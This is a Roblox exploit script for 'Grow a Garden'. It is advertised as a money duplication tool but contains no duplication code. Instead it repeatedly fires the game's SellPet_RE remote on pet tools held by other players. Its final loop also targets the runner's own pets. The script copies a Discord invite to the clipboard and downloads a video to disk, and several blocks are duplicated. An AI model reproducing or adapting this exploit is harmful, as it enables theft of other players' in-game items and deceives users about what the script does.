local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local localPlayer = Players.LocalPlayer

RunService.Heartbeat:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local character = player.Character
            if character then
                local tool = character:FindFirstChildOfClass("Tool")
                if tool then
                    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("SellPet_RE"):FireServer(tool)
                end
            end
        end
    end
end)

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Grow a garden Money Dupe - Made by Ribbined!";
    Text = "Discord invite copied to clipboard 😎 PLEASE JOIN WE ALMOST GOT 1K MEMBERS!!";
    Duration = 15;
})
toclipboard("https://discord.gg/5nWJ8ZMaXk")

local url = "https://github.com/CorpseCMD/MyScripts/raw/refs/heads/main/tutorial%20(online-video-cutter.com).mp4"
local filename = "ribbined_GrowAGardenScriptTutorial1.mp4"

if not isfile(filename) then
    local request = syn and syn.request or http_request
    local result = request({
        Url = url,
        Method = "GET"
    })
    writefile(filename, result.Body)
end

-- Notify user
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Grow a garden Money Dupe - Made by Ribbined!";
    Text = "Discord invite copied to clipboard 😎 PLEASE JOIN WE ALMOST GOT 1K MEMBERS!!";
    Duration = 15;
})
toclipboard("https://discord.gg/5nWJ8ZMaXk")

local url = "https://github.com/CorpseCMD/MyScripts/raw/refs/heads/main/tutorial%20(online-video-cutter.com).mp4"
local filename = "ribbined_GrowAGardenScriptTutorial1.mp4"

if not isfile(filename) then
    local request = syn and syn.request or http_request
    local result = request({
        Url = url,
        Method = "GET"
    })
    writefile(filename, result.Body)
end
task.spawn(function() end)
while true do
    for _, plr in game:GetService("Players"):GetPlayers() do
        if plr.Character then
            local tool = plr.Character:FindFirstChildOfClass("Tool")
            if tool and tool:GetAttribute("PET_UUID") then
                while tool ~= nil do
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SellPet_RE"):FireServer(tool)
                    task.wait()
                end
            end
        end
    end
    task.wait()
end
